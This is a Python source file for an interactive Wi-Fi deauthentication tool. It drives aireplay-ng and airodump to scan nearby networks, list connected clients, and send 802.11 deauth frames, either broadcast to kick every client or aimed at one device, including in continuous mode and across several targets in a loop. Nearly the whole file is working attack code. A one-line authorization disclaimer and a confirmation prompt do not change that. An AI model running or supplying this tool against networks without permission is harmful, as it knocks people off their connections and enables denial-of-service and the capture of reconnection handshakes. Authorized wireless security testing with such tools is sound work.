#!/usr/bin/env python3
"""
Deauthentication module — send 802.11 deauth frames via aireplay-ng.
Use only on networks you own or have explicit permission to test.
"""

import subprocess
import signal
import time
import re
import sys
from wifi_monitor import (scan_wifi, find_wifi_interface, enable_monitor_mode,
                           disable_monitor_mode, get_monitor_interfaces,
                           _verify_monitor_mode)


def check_aireplay():
    """Check if aireplay-ng is available."""
    try:
        subprocess.run(["aireplay-ng", "--help"],
                       capture_output=True, timeout=5)
        return True
    except FileNotFoundError:
        print("[!] aireplay-ng not found. Install: sudo apt install aircrack-ng")
        return False


def send_deauth(mon_iface, bssid, client_mac=None, count=10, continuous=False):
    """
    Send deauth frames.
    - bssid: target AP MAC
    - client_mac: specific client, or None to broadcast (kick everyone)
    - count: number of deauth packets (0 = continuous)
    - continuous: keep sending until Ctrl+C
    """
    cmd = ["aireplay-ng",
           "--deauth", "0" if continuous else str(count),
           "-a", bssid]

    if client_mac:
        cmd += ["-c", client_mac]

    cmd.append(mon_iface)

    target = client_mac if client_mac else "broadcast (all clients)"
    print(f"\n[*] Sending deauth → AP: {bssid}  Target: {target}")
    if continuous:
        print("[*] Continuous mode — press Ctrl+C to stop")
    else:
        print(f"[*] Sending {count} deauth packets...")

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True)

    frames_sent = 0
    try:
        for line in proc.stdout:
            line = line.strip()
            # count sent frames from aireplay output
            m = re.search(r"(\d+)\s+DeAuth", line)
            if m:
                frames_sent = int(m.group(1))
                print(f"\r[*] Deauth frames sent: {frames_sent}", end="", flush=True)
            elif line and "Sending" not in line and "WEP" not in line:
                # show other useful output
                pass
        proc.wait()
    except KeyboardInterrupt:
        proc.send_signal(signal.SIGINT)
        proc.wait(timeout=3)

    print(f"\n[+] Done. Total deauth frames sent: {frames_sent}")
    return frames_sent


def deauth_menu(aps, clients, mon_iface):
    """Interactive deauth menu given scan results."""

    if not aps:
        print("[!] No networks found. Run Wi-Fi scan first.")
        return

    # show APs
    print(f"\n{'='*70}")
    print(f" Select target network")
    print(f"{'='*70}")
    print(f" {'#':<4}{'ESSID':<28}{'BSSID':<20}{'Ch':<5}{'Enc':<12}{'Signal'}")
    print(f" {'-'*2:<4}{'-'*26:<28}{'-'*17:<20}{'-'*3:<5}{'-'*10:<12}{'-'*8}")
    for i, ap in enumerate(aps, 1):
        essid = ap["essid"][:26] if ap["essid"] else "<hidden>"
        print(f" {i:<4}{essid:<28}{ap['bssid']:<20}{ap['channel']:<5}"
              f"{ap['encryption']:<12}{ap['power']} dBm")
    print(f" {'='*70}")

    print("\n[?] Enter network number (or 'q' to cancel):")
    choice = input("    > ").strip()
    if choice.lower() == "q":
        return
    try:
        ap = aps[int(choice) - 1]
    except (ValueError, IndexError):
        print("[!] Invalid selection")
        return

    bssid = ap["bssid"]
    essid = ap["essid"] or "<hidden>"
    print(f"\n[*] Target: {essid} ({bssid})")

    # show clients connected to this AP
    ap_clients = [c for c in clients if c["bssid"] == bssid]

    print(f"\n{'─'*50}")
    print(f" Deauth mode:")
    print(f"  1 = Broadcast — kick ALL clients from {essid}")
    if ap_clients:
        print(f"  2 = Target specific client ({len(ap_clients)} connected)")
    print(f"{'─'*50}")
    print("[?] Choose mode:")
    mode = input("    > ").strip()

    client_mac = None
    if mode == "2" and ap_clients:
        print(f"\n Connected clients:")
        for i, c in enumerate(ap_clients, 1):
            print(f"  {i}. {c['mac']}  signal: {c['power']} dBm"
                  + (f"  probed: {c['probed']}" if c.get("probed") else ""))
        print("[?] Client number (or enter MAC manually):")
        sel = input("    > ").strip()
        if re.match(r"[0-9A-Fa-f:]{17}", sel):
            client_mac = sel
        else:
            try:
                client_mac = ap_clients[int(sel) - 1]["mac"]
            except (ValueError, IndexError):
                print("[!] Invalid, using broadcast")

    # packet count
    print("\n[?] Packet count (default 10, 0 = continuous until Ctrl+C):")
    cnt = input("    > ").strip()
    try:
        count = int(cnt) if cnt else 10
    except ValueError:
        count = 10

    continuous = (count == 0)

    # confirm
    target_str = client_mac if client_mac else "ALL clients (broadcast)"
    print(f"\n[!] About to deauth:")
    print(f"    Network : {essid} ({bssid})")
    print(f"    Target  : {target_str}")
    print(f"    Packets : {'continuous' if continuous else count}")
    print(f"    Interface: {mon_iface}")
    print(f"\n[?] Confirm (y/n):")
    if input("    > ").strip().lower() != "y":
        print("[*] Cancelled")
        return

    send_deauth(mon_iface, bssid, client_mac, count, continuous)


def interactive_deauth():
    """Full interactive deauth flow: scan → select → deauth."""
    if not check_aireplay():
        return

    # check for existing monitor interface
    mon_interfaces = get_monitor_interfaces()
    mon_iface = None
    need_disable = False

    if mon_interfaces:
        mon_iface = mon_interfaces[0]
        print(f"[*] Using existing monitor interface: {mon_iface}")
    else:
        iface = find_wifi_interface()
        if not iface:
            print("[!] No Wi-Fi adapter found")
            return

        print(f"[*] Found adapter: {iface}")
        print("[?] Enable monitor mode? This will kill Wi-Fi connections. (y/n)")
        if input("    > ").strip().lower() != "y":
            print("[*] Cancelled")
            return

        mon_iface = enable_monitor_mode(iface)
        need_disable = True

    if not _verify_monitor_mode(mon_iface):
        print(f"[!] {mon_iface} is not in monitor mode")
        return

    # scan for networks
    print("\n[?] Scan duration before deauth (seconds, default 15):")
    dur = input("    > ").strip()
    try:
        duration = int(dur) if dur else 15
    except ValueError:
        duration = 15

    print(f"\n[*] Scanning for {duration}s to find targets...")

    from wifi_monitor import run_airodump, parse_airodump_csv, print_wifi_results
    csv_path = run_airodump(mon_iface, duration)
    aps, clients = parse_airodump_csv(csv_path)

    if not aps:
        print("[!] No networks found during scan")
        if need_disable:
            disable_monitor_mode(mon_iface)
        return

    print_wifi_results(aps, clients)

    # deauth loop — allow multiple attacks
    while True:
        deauth_menu(aps, clients, mon_iface)
        print("\n[?] Deauth another target? (y/n)")
        if input("    > ").strip().lower() != "y":
            break

    if need_disable:
        disable_monitor_mode(mon_iface)
